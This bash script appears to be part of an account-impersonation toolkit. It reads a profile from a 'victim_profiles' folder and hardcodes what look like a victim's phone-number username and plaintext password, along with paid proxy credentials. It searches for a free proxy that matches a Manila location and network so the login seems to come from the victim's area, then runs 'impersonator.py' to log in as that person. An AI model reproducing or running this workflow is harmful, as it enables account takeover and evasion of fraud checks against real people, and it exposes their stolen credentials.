#!/bin/bash
# run_with_free_proxy.sh - Auto-convert DataImpulse proxy to free proxy and run impersonator

# Configuration
PROFILE="/tmp/victim_profiles/dfeae41a-b52d-4e4c-8415-b1e1840d7134_profile.json"
USERNAME="09071291768"
PASSWORD="eiankhurt0412"
DATAIMPULSE_PROXY="768b27aac68d92f840d9:b7564921f7b4962f@gw.dataimpulse.com:823"

SCRIPT_DIR="$HOME/haymayndz"

echo "============================================================"
echo "AUTO-CONVERTING DATAIMPULSE PROXY TO FREE PROXY"
echo "============================================================"
echo ""

# Convert DataImpulse proxy to free proxy
FREE_PROXY=$(python3 "$SCRIPT_DIR/convert_to_free_proxy.py" "$DATAIMPULSE_PROXY" 2>&1 | grep -A 1 "\[OUTPUT\] Free Proxy String:" | tail -1 | sed 's/^[[:space:]]*//')

if [ -z "$FREE_PROXY" ] || [ "$FREE_PROXY" == "None" ]; then
    echo "[ERROR] Failed to get free proxy. Trying direct method..."
    
    # Try direct conversion
    FREE_PROXY=$(python3 -c "
from free_proxy_manager import FreeProxyManager
import sys

manager = FreeProxyManager()
location_data = manager.parse_location_string('ph;state.metromanila;city.manila;zip.1001;asn.139831')
result = manager.find_matching_proxy(location_data, max_attempts=20)
if result:
    print(result['proxy_string'])
else:
    sys.exit(1)
" 2>/dev/null)
fi

if [ -z "$FREE_PROXY" ] || [ "$FREE_PROXY" == "None" ]; then
    echo "[ERROR] Could not get free proxy. Using DataImpulse proxy instead..."
    FREE_PROXY="$DATAIMPULSE_PROXY"
fi

echo ""
echo "============================================================"
echo "RUNNING IMPERSONATOR WITH PROXY"
echo "============================================================"
echo ""
echo "Profile: $PROFILE"
echo "Username: $USERNAME"
echo "Password: $PASSWORD"
echo "Proxy: $FREE_PROXY"
echo ""

# Run impersonator
python3 "$SCRIPT_DIR/impersonator.py" \
    --profile "$PROFILE" \
    --username "$USERNAME" \
    --password "$PASSWORD" \
    --proxy "$FREE_PROXY"

